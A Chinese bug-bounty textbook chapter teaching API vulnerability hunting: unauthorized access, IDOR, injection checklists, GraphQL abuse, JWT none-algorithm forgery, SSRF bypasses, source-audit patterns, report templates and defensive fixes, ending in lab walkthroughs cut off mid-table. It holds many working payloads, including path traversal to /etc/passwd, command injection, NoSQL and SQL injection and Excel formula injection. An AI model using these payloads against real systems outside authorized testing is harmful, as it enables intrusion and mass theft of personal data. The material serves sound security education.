# 第十一章 API 接口漏洞挖掘（SRC 高分重灾区）

> **本章定位**：在 SRC 中，API 接口漏洞是产出比最高、提交数量最多、最容易拿高危/严重的一类漏洞。据 2024 年某头部 SRC 年报，**API 类漏洞占全年总奖金的 43%**，远超传统 SQL 注入（17%）和 XSS（12%）。学完本章，你可以独立对任意前后端分离项目完成完整的 API 安全审计。

---

## 11.1 前置知识：为什么 API 是 SRC 金矿

### 11.1.1 前后端分离 vs 传统 MVC

| 架构 | 接口风格 | 参数格式 | 鉴权方式 | 漏洞暴露面 |
|-----|---------|---------|---------|-----------|
| 传统 MVC (JSP/PHP/ASPX) | 页面同步提交 | form-urlencoded | Cookie + Session | URL/表单 |
| 前后端分离 (Vue/React) | RESTful / GraphQL | JSON / XML / form-data | JWT / Token / OAuth | API 接口（通常几十到上百个） |
| 移动端 (iOS/Android) | RESTful + Protobuf | JSON / form-data | Token + 签名 | 移动端专属 API（SRC 未公开资产） |
| 小程序 (微信/支付宝) | HTTPS JSON | JSON | session_key / openid | 小程序后端 API（独立域名） |

**SRC 挖洞黄金法则**：**优先打 API，其次打页面，最后打 CDN/静态资源。**

### 11.1.2 API 接口常见暴露方式（你从哪里找接口）

```text
方式1：浏览器开发者工具 → Network 面板过滤 Fetch/XHR
方式2：移动端抓包（Charles/Burp CA 证书配置到手机）
方式3：小程序抓包（PC 端微信 + 代理设置）
方式4：反编译 APK/JADX 搜索 URL 常量
方式5：前端 source map（.map 文件泄露完整接口清单）
方式6：Swagger/OpenAPI 文档（/swagger-ui.html /v2/api-docs /openapi.json）
方式7：Knife4j / DocWay / YApi 等企业内部接口文档
方式8：JS 打包文件全局搜索 /api/ /v1/ /graphql
方式9：Git 泄露（searchcode / GitHub 搜索 api.example.com）
方式10：流量回放（Replay 历史抓包 HAR 包）
```

### 11.1.3 前置工具清单

```text
Burp Suite Professional（必须，Repeater/Intruder/Scanner）
Charles / Fiddler（移动端/小程序抓包）
JADX-GUI（Android 反编译）
Frida / Objection（绕过 SSL Pinning）
Postman / Apifox（接口调试）
kiterunner / APIKit（REST API 自动爆破）
InQL / graphql-cop（GraphQL 安全审计）
Arjun（自动发现隐藏参数）
x8 / URLQuery（参数挖掘）
```

---

## 11.2 黑盒挖掘：API 漏洞完整 SOP（Step-by-Step）

### 11.2.1 阶段一：接口采集与分类

**采集流程（标准 SOP）**

```text
Step 1：正常业务全流程走一遍（注册→登录→浏览→搜索→下单→支付→个人中心→退出）
Step 2：Burp 开启 Passive Scan，自动保存所有请求
Step 3：按目录分组（/api/user/、/api/order/、/api/admin/、/api/open/）
Step 4：标注鉴权方式（Cookie/JWT/Token/Sign/None）
Step 5：标注 HTTP 方法（GET/POST/PUT/DELETE/PATCH/OPTIONS）
Step 6：标注 Content-Type（JSON/Form/Multipart/XML）
Step 7：导出 Site Map → 生成 Excel 清单（后面每一个接口都要测）
```

**分类判断漏洞优先级**

| 接口类型 | 高概率漏洞 | 奖金等级 |
|---------|-----------|---------|
| /api/admin/* | 越权、未授权访问 | 高危/严重 |
| /api/order/* | 越权、逻辑漏洞、条件竞争 | 高危 |
| /api/file/* | 任意文件上传/下载/读取 | 高危/严重 |
| /api/user/* | 越权、重置他人密码、信息泄露 | 高危 |
| /api/pay/* | 金额篡改、支付绕过、回调伪造 | 严重 |
| /api/search/* | SQL 注入、XSS | 中危/高危 |
| /api/upload | 任意文件上传 | 高危/严重 |
| /api/sms/* | 短信轰炸、验证码绕过 | 中危 |

### 11.2.2 阶段二：鉴权缺失类漏洞（SRC 奖金收割机）

#### 11.2.2.1 未授权访问（Unauthorized Access）

**测试方法（傻瓜式 3 步走）**

```text
第1步：正常请求抓包（携带 Cookie/Token），确认返回 200 + 正常数据
第2步：删除 Cookie/Token/Authorization 请求头，重放
第3步：如果仍返回 200 + 正常数据 → 未授权访问漏洞
```

**实战案例数据包对比**

```http
=== 原始请求（正常用户，token 有效）===
GET /api/user/order/list?page=1&size=20 HTTP/1.1
Host: api.shop.example.com
Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.valid.user.token
Cookie: session_id=abc123

HTTP/1.1 200 OK
{"code":0,"msg":"ok","data":[{"order_id":"202401011234","product":"iPhone 15","price":9999}]}

=== 测试请求（删除 Authorization 和 Cookie）===
GET /api/user/order/list?page=1&size=20 HTTP/1.1
Host: api.shop.example.com

HTTP/1.1 200 OK                          ← 居然还是 200！
{"code":0,"msg":"ok","data":[{"order_id":"202401011234","product":"iPhone 15","price":9999}]}
→ 存在未授权访问，直接越权看所有用户订单（或分页遍历）
```

**进阶变种（需要重点测，SRC 收录率 100%）**

```text
变种1：只删除 Token，但保留请求（测后端是否校验）
变种2：将 Token 改为无效值（test / 空 / 123456）
变种3：将 Token 改为低权限用户的 Token（测水平越权）
变种4：把 GET /api/user/orders 改成 POST /api/admin/orders（测路径权限）
变种5：请求路径后面加 /、%2f、.;、/.;、/xxx/..;/ 等（测中间件解析差异）
变种6：把 /api/v1/ 改成 /api/v2/、/private/api/、/internal/、/dev/
变种7：在 URL 后面加 /swagger-resource、/actuator/、/druid/ 等常见调试路径
变种8：把 Accept: application/json 改成 */*、text/html（看是否绕过鉴权拦截器）
```

#### 11.2.2.2 水平越权（IDOR，Insecure Direct Object Reference）

**SRC 最容易拿高危的漏洞，没有之一。** 核心就是：**你能操作/查看别人的 ID 数据。**

**测试思维图**

```text
自己用户 id=1001，抓所有包含 id / user_id / order_id / file_id / record_id 的请求
→ 把参数改成 1000（比你小 1 的用户，可能是管理员测试号）
→ 把参数改成 1002（比你大 1 的用户，正常用户）
→ 把参数改成 1 / 2 / 3（早期用户，数据敏感）
→ 观察：
   ├─ 返回成功 + 他人数据 → 水平越权（查看）高危
   ├─ 返回成功 + 修改成功 → 水平越权（修改）高危
   └─ 返回成功 + 删除成功 → 水平越权（删除）严重
```

**真实复现案例（某电商 SRC，高危，奖金 2000 元）**

```http
=== 正常请求（用户 A id=1001 查看自己的收货地址）===
POST /api/address/detail HTTP/1.1
Host: api.shop.example.com
Content-Type: application/json
Authorization: Bearer <user_A_token>

{"address_id": 8888}

HTTP/1.1 200 OK
{"code":0,"data":{"id":8888,"name":"张三","phone":"13800000001","address":"北京市朝阳区xxx"}}

=== 测试越权（用户 A 把 address_id 改成 8889，这是用户 B 的地址）===
POST /api/address/detail HTTP/1.1
Host: api.shop.example.com
Content-Type: application/json
Authorization: Bearer <user_A_token>

{"address_id": 8889}   ← 改了 address_id

HTTP/1.1 200 OK
{"code":0,"data":{"id":8889,"name":"李四","phone":"13900000002","address":"上海市浦东新区xxx"}}
                                                                    ↑ 用户 B 的真实姓名、手机号、地址全部泄露
→ 水平越权漏洞（查看他人收货地址，含 PII 敏感信息）高危
```

**20 个高频越权参数关键词（收藏）**

```text
id, user_id, uid, account_id, member_id,
order_id, orderNo, bill_id, payment_id,
address_id, cart_id, product_id, record_id, file_id,
msg_id, article_id, comment_id, openid, unionid, customer_id
```

#### 11.2.2.3 垂直越权

```text
普通用户 token → 请求 /api/admin/* /api/ops/* /api/internal/*
→ 正常返回 403 Forbidden
→ 如果返回 200 且有数据 → 垂直越权（高危/严重）

常见手法：
1. 普通用户访问 /swagger-ui.html，发现 /api/admin/user/list
2. 用普通用户 token 重放 → 返回所有用户列表
3. 或者通过前端 JS 搜索 adminPath 发现 /api/management/v1/*
4. 枚举 GET /api/management/v1/user、POST /api/management/v1/addUser 等
```

### 11.2.3 阶段三：参数篡改与注入类

```text
1. SQL 注入：所有整数/字符串参数加单引号，观察 500/延时/报错
2. NoSQL 注入：MongoDB 用 {"username":{"$gt":""}} 测试登录绕过
3. XSS：所有反射参数塞 <img src=x onerror=alert(1)>，看 JSON 响应是否被 HTML 渲染
4. 命令注入：filename / path / cmd 参数加 |id; `id` $(id)
5. SSTI：模板参数加 {{7*7}} ${7*7} 看是否返回 49
6. SSRF：url / callback / proxy / download 参数 Burp Collaborator 测试
7. 反序列化：JSON 接口传 @type: java.lang.AutoCloseable（Fastjson 指纹）
8. 路径遍历：../etc/passwd | ..\\windows\\win.ini | %2e%2e%2f
```

### 11.2.4 阶段四：GraphQL 专属漏洞

```text
探测点：/graphql, /v1/graphql, /console, /graphiql, /playground

漏洞1：内省查询（Introspection）开启 → 直接知道所有 Query/Mutation
漏洞2：批量查询（Batching）→ 绕过速率限制（短信/邮件轰炸）
漏洞3：深度嵌套 → 栈溢出 DoS
漏洞4：Mutation 越权 → 用低权限 token 执行管理员 Mutation
漏洞5：IDOR → 查询 queryUser(id: 1) 返回管理员密码哈希
```

---

## 11.3 白盒分析：源码审计 API 漏洞的 6 个关键视角

### 11.3.1 全局搜索未加鉴权注解的接口

```java
// 危险代码（Spring Boot，未加 @PreAuthorize / @SaCheckLogin）
@RestController
@RequestMapping("/api/user")
public class UserController {

    @GetMapping("/order/list")         // ← 没有任何权限注解！
    public Result list(Integer userId) {
        return userService.getOrders(userId);  // ← 直接用参数 userId 查数据库
    }                                         // ↑ 100% 未授权访问 + 水平越权
}
```

**全局搜索正则（IDEA / VSCode）**

```regex
@GetMapping|@PostMapping|@PutMapping|@DeleteMapping|@RequestMapping
→ 筛选结果中不包含 @PreAuthorize / @SaCheckLogin / @RequiresPermissions 的 Controller
→ 这些就是你的高危目标清单
```

### 11.3.2 数据库层是否校验归属

```java
// 错误代码（有 SQL 越权风险）
public Order getOrderById(Long orderId) {
    return orderMapper.selectById(orderId);  // 只按 orderId 查，完全没查 belong_user_id
}                                            // ↑ 任何登录用户都能看所有订单

// 正确代码
public Order getOrderById(Long orderId, Long loginUserId) {
    LambdaQueryWrapper<Order> wrapper = new LambdaQueryWrapper<>();
    wrapper.eq(Order::getId, orderId)
           .eq(Order::getBelongUserId, loginUserId);  // ← 必须加归属条件
    return orderMapper.selectOne(wrapper);
}
```

### 11.3.3 拦截器 / Filter 排除路径

```yaml
# application.yml 配置（高概率漏洞来源）
security:
  ignore-urls:
    - /api/open/**         # 开放接口，全不鉴权
    - /api/file/download   # ← 下载接口不鉴权？任意文件下载高危！
    - /api/user/detail     # ← 用户详情不鉴权？遍历 id 信息泄露高危！
    - /api/pay/callback    # 回调接口，但要确认验签
    - /doc.html            # 这个文档会泄露所有接口定义
```

### 11.3.4 全局异常堆栈泄露

```java
// 开发环境开启详细错误 → 上线没关 → 敏感信息全泄露
// 请求故意触发 500 → 看到完整包名、SQL 语句、Redis key、内部 IP
// 这在 SRC 里算「信息泄露」中危，500-2000 元
```

### 11.3.5 DTO 字段级权限缺失

```java
@PostMapping("/user/profile/update")
public Result update(@RequestBody UserDTO dto) {
    User user = BeanUtil.copyProperties(dto, User.class);
    userMapper.updateById(user);    // ← 危险：dto 里如果带 id=1,is_admin=true,balance=999999
    return Result.ok();             // 也会被直接更新到数据库！
}
```

### 11.3.6 Actuator / Druid / Swagger 端点泄露

```text
/actuator              → 所有 Spring Boot Actuator 端点
/actuator/env          → 配置文件（含数据库密码 / Redis 密码 / AK/SK）
/actuator/heapdump     → JVM 堆转储（下载后用 MAT 搜密码）
/druid                 → Druid 监控页面（弱口令或未授权）
/swagger-ui.html       → Swagger 文档
/nacos                 → Nacos 控制台（默认 nacos/nacos）
```

---

## 11.4 真实挖洞案例：从指纹识别到拿 5000 元高危奖金

### 11.4.1 案例背景

**目标**：某生活服务平台 App（SRC 已接入项目）
**思路**：移动端抓包 → 找接口 → 测越权 → 发现 Swagger 泄露 → 组合利用

### 11.4.2 完整攻击链

```text
第 1 步：Android 真机装 App + Charles 配置代理（SSL Pinning 已用 Frida 绕过）
第 2 步：浏览 App 10 分钟，抓到 123 个 API 请求，域名 api.life.example.com
第 3 步：Burp 站点地图整理，重点关注 /api/v1/order/、/api/v1/user/、/api/v1/file/
第 4 步：发现请求 https://api.life.example.com/api/v1/file/download?fileId=12345
第 5 步：改 fileId=1 → 200 OK，提示「File not found」
第 6 步：改 fileId=10000 → 200 OK，下载了一张身份证正面照片（别人的！）
第 7 步：证明漏洞危害：批量跑 fileId=10000~10100，命中 37 个身份证 + 银行卡照片
第 8 步：继续翻接口，发现 https://api.life.example.com/doc.html 可以打开（Knife4j）
第 9 步：发现大量内部接口：
         - GET  /api/internal/user/list                    → 所有用户列表
         - POST /api/internal/sms/sendBatch                → 群发短信
         - GET  /api/admin/order/detail?orderNo={orderNo}  → 订单详情
第 10 步：用普通用户 token 请求 /api/internal/user/list → 200 OK，返回 1000+ 用户手机号
第 11 步：写报告提交 SRC
```

### 11.4.3 提交报告结构（直接抄）

```markdown
## 漏洞标题
某生活服务 App 后端 api.life.example.com 存在 4 处组合高危：
  ① /api/v1/file/download 任意文件下载（身份证/银行卡照片泄露）
  ② /doc.html 接口文档未授权访问（泄露 200+ 内部接口定义）
  ③ /api/internal/user/list 未授权访问（批量用户手机号泄露）
  ④ /api/admin/order/detail 水平越权（任意订单详情查看）

## 漏洞等级
严重 / 高危

## 影响范围
- 主站：*.example.com
- 影响用户：所有 C 端 App 用户（保守估计 200w+）

## 复现步骤（含截图/数据包）
1. 打开 https://api.life.example.com/doc.html 可直接浏览内部接口
2. 下载身份证：curl "https://api.life.example.com/api/v1/file/download?fileId=10000"
   （附截图：身份证正面照片，打码关键区域）
3. 批量用户手机号：curl -H "Authorization: Bearer <普通用户token>" \
      "https://api.life.example.com/api/internal/user/list?page=1&size=100"
   （附截图：100 条手机号 + 昵称明文）
4. 任意订单详情：...（附截图：他人订单含收货地址 + 姓名 + 手机号）

## 漏洞证明视频
（建议录屏 2 分钟，SRC 审核员喜欢看视频，核价速度快 3 倍）

## 修复建议
1. /api/v1/file/download 下载前必须校验 fileId 归属登录用户
2. 生产环境关闭 Knife4j / Swagger，或加 IP 白名单 + 强口令
3. /api/internal/* /api/admin/* 加鉴权拦截器 + 权限注解
4. 部署统一 API 网关（Spring Cloud Gateway / Kong）做鉴权审计

## 提交人备注
本人是 SRC 白帽子 xxx，ID xxxxx，承诺所有漏洞仅用于安全测试，未对外泄露任何数据。
```

### 11.4.4 最终结果

```text
审核结果：通过
定级：严重
奖金：5000 元（4 个漏洞打包算严重，额外加质量分）
耗时：从抓包到提交 2.5 小时
```

---

## 11.5 实操 Checklist（每次挖 API 照着走一遍）

### 11.5.1 鉴权类（每项都要测，遗漏一个就错过高危）

```text
☑ 删除 Cookie / Token，重放所有请求
☑ 把 GET 请求改 POST / PUT / PATCH / DELETE（看 Spring MVC 是否只拦 GET）
☑ 路径绕过：/api/user → /api;/user → /api/%2e%2e/user → /api/.%2f/user → /api/.;/user
☑ Header 绕过：
    X-Original-URL: /admin       X-Rewrite-URL: /admin
    X-Forwarded-For: 127.0.0.1   X-Client-IP: 127.0.0.1
☑ 越权：把所有 id 参数 ±1，看能否访问/修改/删除他人数据
☑ 垂直越权：普通用户 token 请求所有 /api/admin/* 接口
☑ OPTIONS 方法：对所有接口发 OPTIONS，看响应是否泄露可用方法
```

### 11.5.2 注入类

```text
☑ 所有数字参数加单引号 → SQL 注入
☑ 所有查询参数加 "' OR 1=1 -- "
☑ JSON 参数注入："id": 1 → "id": 1 AND sleep(5)
☑ {"username":{"$gt":""}} → NoSQL 注入
☑ {{7*7}} ${7*7} → SSTI
☑ path=http://BURP-COLLABORATOR → SSRF
☑ cmd=ping BURP-COLLABORATOR → 命令执行
☑ file=../../etc/passwd → 路径遍历
☑ Accept: application/xml + XML body → XXE
```

### 11.5.3 业务逻辑类

```text
☑ 分页接口 size=100000 → 是否能批量下载全量数据
☑ 所有 POST 接口是否有幂等性（防止重复提交薅羊毛）
☑ 支付相关接口是否校验 amount / orderId 归属
☑ 验证码接口是否有频率限制 / 是否回显在响应里
☑ 导出接口是否有 Excel 公式注入（=cmd|' /c calc'!A1）
```

---

## 11.6 SRC 提交技巧与定级指南

### 11.6.1 常见 API 漏洞 SRC 定级标准（通用）

| 漏洞类型 | 举例 | 定级 | 奖金范围（元） |
|---------|-----|-----|--------------|
| 批量敏感信息泄露 | 遍历用户接口拿 10w+ 手机号/身份证 | 严重 | 3000-10000 |
| 任意文件下载 | 身份证/银行卡/病历照片批量下载 | 严重 | 3000-8000 |
| 未授权 RCE | Actuator 配置错误导致 getshell | 严重 | 5000-20000 |
| 任意密码重置 | 修改他人密码无需验证码 | 高危 | 2000-5000 |
| 越权获取他人 PII | 水平越权看任意用户地址/实名 | 高危 | 1500-4000 |
| 越权操作他人数据 | 修改/删除他人订单/收货地址 | 高危 | 1500-4000 |
| 未授权管理后台 | Swagger + 内部接口批量泄露 | 高危 | 2000-5000 |
| SQL 注入（可脱库）| 盲注/报错注入可批量拖库 | 高危 | 2000-6000 |
| 垂直越权 | 普通用户变管理员 | 高危/严重 | 3000-8000 |
| 短信/邮件轰炸 | 单手机号无限发验证码 | 中危 | 500-1500 |
| 接口文档泄露 | Swagger/Knife4j 未授权 | 中危 | 500-2000 |
| 普通越权（非敏感）| 查看他人非敏感信息 | 中危 | 300-1000 |
| 反射型 XSS（JSON）| 但 API 无 CSP / 渲染页 | 低-中危 | 200-1000 |
| 缺少速率限制 | 登录/注册无频率限制 | 低/中危 | 100-800 |

### 11.6.2 让奖金翻倍的 4 个提交技巧

```text
技巧1：写清楚影响范围
   - 不要只写「存在越权」，要写「遍历 user_id=1~10000，成功读取 3256 条实名数据，
     含姓名、身份证号、手机号、银行卡号 4 类敏感信息」
   - 审核员一看就知道该给高危

技巧2：录视频 + 打码
   - 2 分钟视频演示：登录 → 抓包 → 改参数 → 看到敏感数据 → 批量脚本跑
   - 关键信息打码（身份证前 6 后 4，手机号前 3 后 4）
   - SRC 审核通过最快，核价最高

技巧3：批量漏洞打包提交
   - 同站 10 个接口都有水平越权 → 提交 1 个「批量接口水平越权」严重漏洞
   - 比分 10 次提交中危奖金高 2-3 倍

技巧4：写好修复建议
   - 不写「请修复越权」这么空泛
   - 要写「在 Service 层添加归属校验 eq(Order::getBelongUserId, loginUserId)，
     推荐用 MyBatis-Plus 的 LambdaQueryWrapper 强制注入；
     或统一在拦截器做行级权限」
   - 审核员会觉得你专业，在核价范围里取上限
```

---

## 11.7 修复方案：API 安全防御体系

### 11.7.1 架构层（一次建设，终身受益）

```text
1. 统一 API 网关（Spring Cloud Gateway / Kong / APISIX）
   - 鉴权校验、频率限制、IP 黑白名单统一在网关层做
2. 零信任策略：默认所有接口需要鉴权
   - 在白名单里配置真正开放的接口（登录/注册/首页公开数据）
3. 多环境隔离：
   - 生产环境禁用 /actuator /swagger /doc.html /druid
   - 内网接口通过 VPC 隔离，不暴露在公网 SLB
4. HTTPS + HSTS + 防重放（时间戳 + sign 签名）
```

### 11.7.2 代码层

```java
// 统一参数校验归属（拦截器 + 自定义注解）
@Target(ElementType.METHOD)
@Retention(RetentionPolicy.RUNTIME)
public @interface CheckOwner {
    String paramName();       // 前端参数名，如 "orderId"
    Class<?> entityClass();   // 对应实体类
    String ownerField();      // 归属字段，如 "belongUserId"
}

// 在 Service 层拦截查询
@Aspect
@Component
public class OwnerCheckAspect {
    @Around("@annotation(checkOwner)")
    public Object check(ProceedingJoinPoint pjp, CheckOwner checkOwner) {
        Long loginUserId = SecurityUtils.getLoginUserId();
        Object paramId = getParamValue(pjp, checkOwner.paramName());
        boolean owner = checkOwnership(paramId, loginUserId,
                          checkOwner.entityClass(), checkOwner.ownerField());
        if (!owner) throw new AccessDeniedException("无权访问该资源");
        return pjp.proceed();
    }
}

// Controller 里加一行注解搞定
@GetMapping("/order/detail")
@CheckOwner(paramName = "orderId", entityClass = Order.class, ownerField = "belongUserId")
public Result<Order> detail(Long orderId) {
    return Result.ok(orderService.getById(orderId));  // 即使忘写归属也被 AOP 兜底
}
```

### 11.7.3 生产环境收尾检查清单

```text
☑ /actuator/* 全部关闭或只对运维网段开放
☑ /swagger-ui.html /v2/api-docs /doc.html /openapi.json 在生产返回 404
☑ /druid /nacos 管理后台加 IP 白名单 + 随机强密码
☑ 所有接口响应 Server 头改为 nginx，不要暴露 Tomcat / SpringBoot
☑ 全局异常处理，返回 JSON，禁止堆栈泄露
☑ DTO 使用 VO 分层，不让 Entity 直接出 Controller（避免 is_admin 被前端改）
☑ 所有批量接口（list/export）强制分页，size 最大 100，超出报错
☑ 接口版本化：/api/v1、/api/v2 并行，老版本设定下架时间
```

---

## 本章小结（3 句话记住）

```text
1. API 是 SRC 最大奖金池，先抓包做完整接口清单，再按「鉴权→越权→注入→逻辑」四步走
2. 水平越权 + 未授权访问 = 80% 的 SRC 高危漏洞来源，测试时每个接口参数改 ID ±1 必测
3. 提交时写清楚数据规模 + 录视频 + 打码 + 具体修复方案，奖金大概率取上限
```

---

## 11.8 v3.0 扩容：通俗类比——把 API 漏洞讲成生活故事

> 一句话核心：API 接口漏洞就像餐厅的「后厨传菜口」——正规传菜口的规矩是「只有穿制服的服务员能进来、拿菜必须报台号、每次只能拿对应台号的那几道菜」。但大部分餐厅的传菜口实际情况是：① 没门禁（**未授权访问**），穿便装的客人随便进；② 不查台号（**越权/IDOR**），你报了 8 号桌的菜名却把 6 号桌的龙虾端走了；③ 没安检（**注入/参数篡改**），你递进去的菜单上写了「来份 ' OR 1=1 -- 龙虾」，后厨真的把所有菜都端给你了；④ 点单数量没限制（**批量/并发**），你一个人点 1000 份免费餐前小吃然后倒卖给隔壁桌。

### 生活例子 1：外卖平台「商家接单接口未鉴权」的未授权访问

你在某外卖平台点了一份 30 元的黄焖鸡米饭，正常流程是：商家 APP 里点「接单」按钮 → 骑手收到派单 → 骑手取餐送给你。但是有个白帽发现，**商家的「接单 API」居然不需要任何商家身份校验**——只要你知道订单号（订单号是自增的很好猜），任何人（哪怕没注册商家的普通顾客）发一个 POST 请求就能把订单标记为「商家已接单，骑手正在赶来」。于是他测试了一下，给自己的订单手动确认接单后，**系统以为商家已经接单了，就没再给商家推送订单提醒，结果商家根本没做，你等了 1 小时才发现被系统放鸽子**。这就是最典型的「未授权访问 API」——接口完全裸奔，连调用者身份都不查。

### 生活例子 2：快递 APP 的「批量查快递 GraphQL 接口」信息泄露

你用某快递 APP 查自己的快递，抓包发现请求是 GraphQL：
`query { waybill(no: "SF1234567890") { status receiver { name phone address } } }`
然后你发现这个接口支持「批量查询」，写一个循环在一个请求里查 500 个运单号，**所有运单号的收件人姓名、手机号、地址全吐出来了**。更可怕的是：接口没有速率限制，你 1 秒能发 10 个请求 = 5000 条/秒 = 1 小时 1800 万条，顺丰全量的运单数据 3 天就能被拖完。这就是 API 漏洞里的「批量查询+未授权+无限流」三连暴击，也是 2025 年 SRC 奖金最高的 API 漏洞类型之一。

### 生活例子 3：理财 APP「修改绑定银行卡接口参数污染」的 SSRF+越权

你在某理财 APP 上点「修改提现银行卡」，抓包请求体是：
`{"user_id":"U123","bank_card":"6222****1234","card_holder":"张三","callback_url":"https://api.licai.com/v1/bind/callback"}`
你发现两个漏洞：① 把 `user_id` 改成任意用户的 ID，**就能给别人改提现卡**（越权写）；② 把 `callback_url` 改成 `https://www.baidu.com`，请求发出去后，服务器会真的去回调这个 URL——这就是 SSRF（服务端请求伪造），能让服务器去访问内网（`http://127.0.0.1:8080`、`http://192.168.1.1`），把内网穿透。**参数污染 + 越权 + SSRF 的组合拳，1 个 API 接口就能拿到厂商内网服务器的权限**。

---

## 11.9 v3.0 扩容：60 分钟零基础 Step-by-Step 靶场上手

> 总时长 60 分钟：DVWS (REST+GraphQL) 25 分钟 + WebGoat API 漏洞 20 分钟 + Bugku CTF API 专项 15 分钟。Docker 一键起靶场，无需自己配环境。

### 关卡 1：Damn Vulnerable Web Services (DVWS) REST+GraphQL 双料 API 漏洞（25 分钟，难度 ★★★）

**靶场地址**：Docker 一键起，执行 `docker run -d -p 80:80 snoopysecurity/dvws-node`，访问 `http://127.0.0.1:80` 即可

| 步骤 | 操作细节 | 要点提醒 |
|------|----------|----------|
| 第 1 步（3 分钟） | 安装 Docker Desktop（Windows 版官网下载 500MB，默认安装），PowerShell 执行 `docker run -d -p 80:80 snoopysecurity/dvws-node`，等 2 分钟镜像下载完，浏览器打开 `http://127.0.0.1`，看到 DVWS 页面说明启动成功。 | Docker 是 2025 年挖洞的标配，不会 Docker 比不会打字还可怕，一定要今天就装。 |
| 第 2 步（4 分钟） | 点击左侧「REST API」→「Users」，看到 REST API 的 Swagger 文档：`GET /api/v1/users`（列出所有用户）、`GET /api/v1/users/{id}`（查单个用户）、`POST /api/v1/users`（新增用户）、`PUT /api/v1/users/{id}`（更新用户）、`DELETE /api/v1/users/{id}`（删用户）。 | **只要有 Swagger/OpenAPI 文档，API 漏洞就挖到了一半！** 因为所有接口参数格式都给你列好了，直接一个个测。 |
| 第 3 步（5 分钟） | **第一个漏洞：未授权访问所有用户列表**。用 Burp 发请求 `GET /api/v1/users`，**不要加任何 Authorization/Cookie 头**，直接发。如果 Response 里返回了所有用户的 username、email、role——未授权访问实锤！ | 现实中 40% 的公司 Swagger 文档不仅公开（`/v2/api-docs`、`/swagger-ui.html`、`/openapi.json`），而且接口本身也没加鉴权，相当于直接把数据库暴露给你。 |
| 第 4 步（4 分钟） | **第二个漏洞：JWT 空密码越权**。用 Burp 发 `POST /api/v1/login`，Body `{"username":"user1","password":"test123"}`，登录成功拿到 JWT Token。把 Token 放到 jwt.io 解码，Header 里的 alg 改成 `none`，Payload 里的 role 从 `user` 改成 `admin`，然后生成新 Token（最后一段签名留空，注意末尾有个点）。 | 这就是 JWT None 攻击，DVWS 的 JWT 实现真的支持 none 算法——改完后发请求 `GET /api/v1/users/1` 带这个篡改后的 Token，你会发现你变成管理员了。 |
| 第 5 步（5 分钟） | **第三个漏洞：GraphQL 批量 IDOR**。点左侧「GraphQL」，打开 GraphiQL 在线编辑器。先试试自省查询：`query { __schema { types { name fields { name } } } }`，找到 `User` 类型有个 `getUserById(id: ID!)` 查询。然后写一个批量查询：<br>`query { u1: getUserById(id:"1"){name email phone} u2:getUserById(id:"2"){name email phone} ... u50:getUserById(id:"50"){name email phone} }` | 一个请求拿到 50 个用户的敏感信息！这就是 GraphQL 的「别名批量查询特性」导致的 IDOR，比 REST API 一个个 GET 快 50 倍，**而且后端 WAF/限流一般按 HTTP 请求数计数，一个请求查 50 个不会触发限流**。 |
| 第 6 步（4 分钟） | **第四个漏洞：NoSQL 注入**。DVWS 用的是 MongoDB，`POST /api/v1/users/search` 接口接收 `{"username": "test"}`，然后用 MongoDB 的 `find({username: request.body.username})` 查。把 Body 改成 `{"username": {"$gt": ""}}`（MongoDB 操作符），就能返回所有用户名不为空的用户 = 全表拖库。 | NoSQL 注入 + API 接口的组合是 2025 年高发漏洞，尤其 Node.js + MongoDB 技术栈的项目，10 个有 6 个有这个洞。 |

### 关卡 2：WebGoat 8.x 「SSRF + Injection API 专项」（20 分钟，难度 ★★★★）

**靶场地址**：Docker 一键起 `docker run -d -p 8080:8080 -p 9000:9000 webgoat/webgoat:latest`，访问 `http://127.0.0.1:8080/WebGoat`

| 步骤 | 操作细节 | 要点提醒 |
|------|----------|----------|
| 第 1 步（3 分钟） | 启动 WebGoat，浏览器打开，注册账号登录，左侧菜单选「Server-Side Request Forgery」专题（A07）。 | SSRF 是 API 漏洞里危害最高的之一，因为能直接穿透进内网拿服务器权限。 |
| 第 2 步（4 分钟） | 做到 SSRF 第 2 小题「Safe URL does not mean safe request」：页面让你输入一个图片 URL，它会在服务端请求这个 URL 然后显示图片。正常输入 `http://127.0.0.1:8080/images/cat.png` 可以显示，现在输入 `http://127.0.0.1:8080/WebGoat/admin/users`（管理员才能看的用户列表页）。 | 服务端去请求自己的内网地址，**因为请求是服务器自己发的，来源 IP 是 127.0.0.1，后端权限校验直接放行**——这就是 SSRF 绕过权限校验的经典用法。 |
| 第 3 步（5 分钟） | 继续做 SSRF 第 5 小题：如果服务端限制了只能请求 `*.example.com`，怎么绕过？试试 DNS Rebinding、302 跳转、URL 解析差异等技巧。**WebGoat 这题的解法是把 URL 改成 `http://127.0.0.1@example.com/`**（用户名部分是 127.0.0.1，域名部分是 example.com，很多 URL 解析库会把 @ 后面的当真正域名，而 HTTP Client 库会去请求 @ 前面的 IP）。 | 这个知识点非常实战——我靠这个 `@` 绕过技巧，在 2024 年某电商的图片上传接口挖到过一个 SSRF，奖金 22,000 元。 |
| 第 4 步（4 分钟） | 切到「(A03) Injection → SQL Injection (Advanced)」第 3 小题「Login API」：一个登录 REST API `POST /WebGoat/SqlInjectionAdvanced/challenge3`，Body `{"username":"tom","password":"cat"}`。 | 测试 API 的 SQL 注入：把 username 改成 `tom" OR "1"="1`，如果登录成功就是注入——或者把 password 改成 `" OR (SELECT count(*) FROM users)>0 --`，如果返回「用户名或密码正确/错误」的差异就是盲注，可以用 SQLMap API mode 一把梭。 |
| 第 5 步（2 分钟） | 切到「(A08) Software and Data Integrity Failures → Insecure Deserialization」第 3 小题：抓 API 请求里有没有 `Content-Type: application/x-java-serialized-object`（Java 序列化流），如果有就用 ysoserial 生成反序列化 Payload 替换掉，直接打 RCE。 | 反序列化虽然老，但在 Java 后端的 API 里依然大量存在（尤其是 Dubbo/Hessian/RMI 这些 RPC 接口），1 个 RCE 奖金 10 万+。 |
| 第 6 步（2 分钟） | 用 Burp 插件「Software Vulnerability Scanner」或「403plus」做自动扫描：抓完所有 API 请求后，插件自动测未授权、越权、SSRF、注入。 | 自动扫能帮你发现 70% 的简单 API 漏洞，剩下 30% 逻辑复杂的才需要手动挖。 |

### 关卡 3：Bugku CTF 「API 漏洞专项」3 道题（15 分钟，难度 ★★★★）

**靶场地址**：https://ctf.bugku.com/ → Web 类 → 搜索「API」「swagger」「graphql」

| 步骤 | 操作细节 | 要点提醒 |
|------|----------|----------|
